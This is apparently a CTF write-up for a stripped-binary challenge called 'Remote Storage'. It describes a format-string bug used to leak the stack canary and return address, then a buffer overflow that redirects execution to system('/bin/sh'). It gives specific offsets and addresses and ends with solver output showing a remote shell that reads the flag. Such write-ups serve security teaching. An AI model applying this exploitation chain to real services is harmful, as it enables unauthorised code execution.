# Remote Storage
* This is my first exploit of stripped binary
* I didn't solve this on time

---
## Binary Analysis
* login user and password is both "admin"
* using "system()" but we cant use "/", "\\" and "."
* fsb in function "sign file"
* bof in fuction "add info"

## Exploit Summery
1. login with (admin/admin)
2. leak canary(%95$x) & ret addr(%94 - 0x1cc)
3. overwrite ret addr to system(@ 0x8052cf0) + /bin/sh(@ 0x80C7B8C) using bof

```
$ python solve.py NOPTRACE
[+] Opening connection to 185.66.87.233 on port 5006: Done
[!] Skipping debug attach since context.noptrace==True
filedata: fuga
kkkk672227e
File sign: fff42a18.820be000."\x82Ӎfiles/hoge 

ret_addr:  0xfff4284c
canary:  0x820be000
[*] Switching to interactive mode
$ cat secret_app_key.txt
Aero{b87b6e63015e5710d6d003d64a29c253}
``` 